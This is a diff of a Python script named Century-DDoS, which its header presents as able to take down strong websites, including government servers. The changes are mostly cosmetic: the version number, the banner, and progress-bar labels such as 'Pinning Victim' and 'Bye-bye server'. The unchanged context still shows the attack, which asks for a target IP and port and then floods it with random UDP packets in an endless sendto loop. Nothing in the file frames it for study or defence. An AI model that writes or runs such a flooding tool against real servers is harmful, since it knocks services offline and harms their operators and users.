@@ -4,8 +4,7 @@
 # | DDoSing is the most massive type of web and server attack                                     |
 # | This tool can takedown strong webstites including goverment servers as well                   |
 # |                                                                                               |
-# |                                                                                               |
-# | author : Ghoul3r , version 1.0                                                                |
+# | author : Ghoul3r , version 1.6                                                                |
 # |-----------------------------------------------------------------------------------------------|
 # | Copyright (c) 2022 Ghoul3r                                                                    |
 # |-----------------------------------------------------------------------------------------------|
@@ -49,7 +48,7 @@ bytes = random._urandom(1490)
 
 # Startign terminal UI
 os.system("clear")
-print '''
+print ''' 
   ____           _                              ____  ____       ____  
  / ___|___ _ __ | |_ _   _ _ __ _   _          |  _ \|  _ \  ___/ ___| 
 | |   / _ \ '_ \| __| | | | '__| | | |  _____  | | | | | | |/ _ \___ \ 
@@ -57,8 +56,11 @@ print '''
  \____\___|_| |_|\__|\__,_|_|   \__, |         |____/|____/ \___/____/ 
                                 |___/ 
 '''
-print "Author   : Ghoul3r"
-print "Github   : https://github.com/Ghoul3r"
+print ''' 
+Author   : Ghoul3r
+Github   : https://github.com/Ghoul3r
+Source   : https://github.com/Ghoul3r/Century-DDoS.git
+'''
 
 # Defining ip variables
 ip = raw_input("IP Target: ")
@@ -85,19 +87,16 @@ def progressbar(it, prefix="", size=60, file=sys.stdout):
 for i in progressbar(range(100), "Fetching Packets: ", 30):
     time.sleep(0.02)
 os.system('clear')
-for i in progressbar(range(100), "Compliling Code: ", 30):
+for i in progressbar(range(100), "Pinning Victim: ", 30):
     time.sleep(0.09)
 os.system('clear')
-for i in progressbar(range(100), "Pinning Server: ", 20):
+for i in progressbar(range(100), "Initializing: ", 20):
     time.sleep(0.04)
 os.system('clear')
-for i in progressbar(range(100), "Initializing: ", 20):
+for i in progressbar(range(100), "Bye-bye server: ", 20):
     time.sleep(0.01)
 os.system('clear')
 time.sleep(0.1)
-print "We are Anonymous, expect us"
-time.sleep(1.5)
-os.system('clear')
 sent = 0
 while True:
      sock.sendto(bytes, (ip,port))
